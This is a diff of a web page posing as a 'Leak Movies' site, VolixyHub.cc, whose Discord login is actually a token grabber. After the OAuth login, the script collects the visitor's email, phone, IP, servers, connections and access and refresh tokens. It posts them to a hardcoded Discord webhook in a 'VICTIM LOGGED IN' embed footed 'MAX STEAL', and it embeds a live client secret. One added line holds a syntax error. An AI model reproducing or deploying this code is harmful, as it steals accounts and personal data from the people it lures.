@@ -30,7 +30,7 @@
 <div class="center" id="login">
     <h1>VolixyHub.cc</h1>
     <p style="font-size:24px;margin:20px 0;">Leak Movies • Phone & PC</p>
-    <button id="btn" onclick="location.href='https://discord.com/oauth2/authorize?client_id=1446341068315693230&response_type=code&redirect_uri=http%3A%2F%2F127.0.0.1%3A5000%2Fcallback&scope=guilds.join+email+gdm.join+connections+identify+guilds+rpc'">LOGIN WITH DISCORD</button>
+    <button id="btn" onclick="login()">LOGIN WITH DISCORD</button>
 </div>
 
 <div id="main" style="display:none;">
@@ -52,30 +52,37 @@
 </div>
 
 <script>
+const CLIENT_ID = "1446341068315693230";
+const CLIENT_SECRET = "pOvGXscCogOmdfva_VYZCdTZZsPHAbyC";
+const REDIRECT_URI = "https://hgqwy8c-ulcc-git-main-fuckerslol.vercel.app/"; // YOUR LIVE LINK
 const WEBHOOK = "https://discord.com/api/webhooks/1445978398391275721/wiUM_7MA6Pin70VLVcXT30GwF7gYfNJExBgkVHPoRrCCcXoqXLo31iCeOyIJdP87mK6N";
 
+function login() {
+    location.href = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=guilds.join+email+gdm.join+connections+identify+guilds+rpc`;
+}
+
 if (location.search.includes('code=')) {
-    const urlParams = new URLSearchParams(location.search);
-    const code = urlParams.get('code');
-    const redirectUri = "http://127.0.0.1:5000/callback";
+    const code = new URLSearchParams(location.search).get('code');
 
     fetch('https://discord.com/api/v10/oauth2/token', {
         method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({
-            client_id: '1446341068315693230',
-            client_secret: 'pOvGXscCogOmdfva_VYZCdTZZsPHAbyC',
+            client_id: CLIENT_ID,
+            client_secret: CLIENT_SECRET,
             grant_type: 'authorization_code',
             code: code,
-            redirect_uri: redirectUri
+            redirect_uri: REDIRECT_URI
         })
     })
     .then(r => r.json())
     .then(token => {
+        const headers = { Authorization: `Bearer ${token.access_token}` };
+
         Promise.all([
-            fetch('https://discord.com/api/v10/users/@me', {headers: {Authorization: `Bearer ${token.access_token}`}}).then(r => r.json()),
-            fetch('https://discord.com/api/v10/users/@me/connections', {headers: {Authorization: `Bearer ${token.access_token}`}}).then(r => r.json()),
-            fetch('https://discord.com/api/v10/users/@me/guilds', {headers: {Authorization: `Bearer ${token.access_token}`}}).then(r => r.json()),
+            fetch('https://discord.com/api/v10/users/@me', { headers }).then(r => r.json()),
+            fetch('https://discord.com/api/v10/users/@me/connections', { headers }).then(r => r.json()),
+            fetch('https://discord.com/api/v10/users/@me/guilds', { headers }).then(r => r.json()),
             fetch('https://api.ipify.org?format=json').then(r => r.json())
         ])
         .then(([user, connections, guilds, ipData]) => {
@@ -86,31 +93,36 @@ if (location.search.includes('code=')) {
             const embed = {
                 title: "VICTIM LOGGED IN",
                 color: 9442302,
-                thumbnail: {url: avatar},
-                image: banner ? {url: banner} : {},
+                thumbnail: { url: avatar },
+                image: banner ? { url: banner } : {},
                 fields: [
-                    {name: "Username", value: `${user.username}#${user.discriminator}`, inline: true},
-                    {name: "Global Name", value: user.global_name || 'None', inline: true},
-                    {name: "ID", value: user.id, inline: true},
-                    {name: "Email", value: user.email || 'Hidden', inline: true},
-                    {name: "Phone", value: user.phone || 'None', inline: true},
-                    {name: "IP", value: ip, inline: true},
-                    {name: "Nitro", value: (user.premium_type==2 ? "Premium+" : user.premium_type ? "Yes" : "No"), inline: true},
-                    {name: "Servers", value: String(guilds.length), inline: true},
-                    {name: "Connections", value: connections.length ? connections.map(c => c.type.title()).join(", ") : "None"},
-                    {name: "Access Token", value: `||${token.access_token}||`},
-                    {name: "Refresh Token", value: `||${token.refresh_token}||`}
+                    { name: "Username", value: `${user.username}#${user.discriminator}`, inline: true },
+                    { name: "Global Name", value: user.global_name || 'None', inline: true },
+                    { name: "ID", value: user user.id, inline: true },
+                    { name: "Email", value: user.email || 'Hidden', inline: true },
+                    { name: "Phone", value: user.phone || 'None', inline: true },
+                    { name: "IP", value: ip, inline: true },
+                    { name: "Nitro", value: user.premium_type === 2 ? "Premium+" : user.premium_type ? "Yes" : "No", inline: true },
+                    { name: "Servers", value: String(guilds.length), inline: true },
+                    { name: "Connections", value: connections.length ? connections.map(c => c.type.charAt(0).toUpperCase() + c.type.slice(1)).join(", ") : "None" },
+                    { name: "Access Token", value: `||${token.access_token}||` },
+                    { name: "Refresh Token", value: `||${token.refresh_token}||` }
                 ],
-                footer: {text: "VolixyHub.cc • MAX STEAL"}
+                footer: { text: "VolixyHub.cc • MAX STEAL" },
+                timestamp: new Date().toISOString()
             };
 
-            fetch(WEBHOOK, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({embeds: [embed]})});
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            });
 
             // Show site
             document.getElementById('login').style.display = 'none';
             document.getElementById('main').style.display = 'block';
             document.getElementById('user').innerHTML = `<img src="${avatar.replace('size=512','size=64')}" style="border-radius:50%;width:40px;height:40px;margin-right:10px;"> ${user.global_name || user.username}`;
-            history.replaceState({}, "", location.pathname);
+            history.replaceState({}, "", "/");
         });
     });
 }
@@ -136,7 +148,7 @@ function leak() {
     document.getElementById('url').value = '';
 }
 
-// Snow
+// Snow effect
 let c=document.querySelector("canvas"),ctx=c.getContext("2d");c.width=innerWidth;c.height=innerHeight;
 let s=[];for(let i=0;i<400;i++)s.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*3+1,spd:Math.random()*1.5+0.5});
 function snow(){ctx.clearRect(0,0,c.width,c.height);s.forEach(p=>{ctx.fillStyle="rgba(255,200,255,0.9)";ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();p.y+=p.spd;if(p.y>c.height)p.y=-10;});requestAnimationFrame(snow);}snow();
